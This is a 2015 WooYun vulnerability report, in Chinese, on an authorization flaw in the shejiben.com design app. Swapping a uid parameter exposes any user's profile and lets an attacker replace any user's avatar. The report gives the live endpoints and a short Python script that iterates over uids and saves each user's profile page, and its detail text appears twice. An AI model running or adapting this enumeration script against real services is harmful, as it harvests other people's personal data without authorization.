{"id": 39814, "wybug_id": "wooyun-2015-093179", "wybug_title": "设计本app越权访问之二（查看任意用户信息，修改用户信息）", "wybug_corp": "土巴兔装修网", "wybug_author": "hkAssassin", "wybug_date": "2015-01-22 18:46", "wybug_open_date": "2015-03-08 18:48", "wybug_type": "未授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["越权操作", "用户敏感信息泄露"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-02-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-02-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-02-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-03-08：\t细节向公众公开  简要描述： app权限没做任何控制导致可以无障碍查看任意用户信息 详细说明：  问题一：查看任意用户信息\nhttp://www.shejiben.com/mobileapp/my/info.php?uid=1300817  http://www.shejiben.com//mobileapp/my/index.php?uid=1这两个地址都可以得到用户信息，这是我做app渗透测试的时候得到的连接，通过pc端也可以访问。直接变换uid即可得到用户信息，uid在设计本网站上是公开的，所以基本上写一个脚本一刷用户信息全得到。下面是我写的一个简单的脚本：#coding=utf-8import urllibdef getHtml(url):    page = urllib.urlopen(url)    html = page.read()    return htmlfor id in range(1300000,1300999):        if id== 1300999:            break        else:            print str(id)            html = getHtml(\"http://www.shejiben.com/mobileapp/my/info.php?uid=\"+str(id))            fileHandle=open('shejiben.txt','a')            fileHandle.write('\\n'+html)            fileHandle.close()\n下面这张图是我刷到的一些用户信息，截图做个证明（只刷了其中一个链接）：\n\n问题二：任意修改用户头像app修改头像处抓包，变换uid即可替换用户头像；截图如下：\n\n   漏洞证明：  问题一：查看任意用户信息\nhttp://www.shejiben.com/mobileapp/my/info.php?uid=1300817  http://www.shejiben.com//mobileapp/my/index.php?uid=1这两个地址都可以得到用户信息，这是我做app渗透测试的时候得到的连接，通过pc端也可以访问。直接变换uid即可得到用户信息，uid在设计本网站上是公开的，所以基本上写一个脚本一刷用户信息全得到。下面是我写的一个简单的脚本：#coding=utf-8import urllibdef getHtml(url):    page = urllib.urlopen(url)    html = page.read()    return htmlfor id in range(1300000,1300999):        if id== 1300999:            break        else:            print str(id)            html = getHtml(\"http://www.shejiben.com/mobileapp/my/info.php?uid=\"+str(id))            fileHandle=open('shejiben.txt','a')            fileHandle.write('\\n'+html)            fileHandle.close()\n下面这张图是我刷到的一些用户信息，截图做个证明（只刷了其中一个链接）：\n\n问题二：任意修改用户头像app修改头像处抓包，变换uid即可替换用户头像；截图如下：\n\n   修复方案：  权限控制，等着确认了，继续放大招！   版权声明：转载请注明来源 hkAssassin@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-01-23 09:28 厂商回复： 感谢报告 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}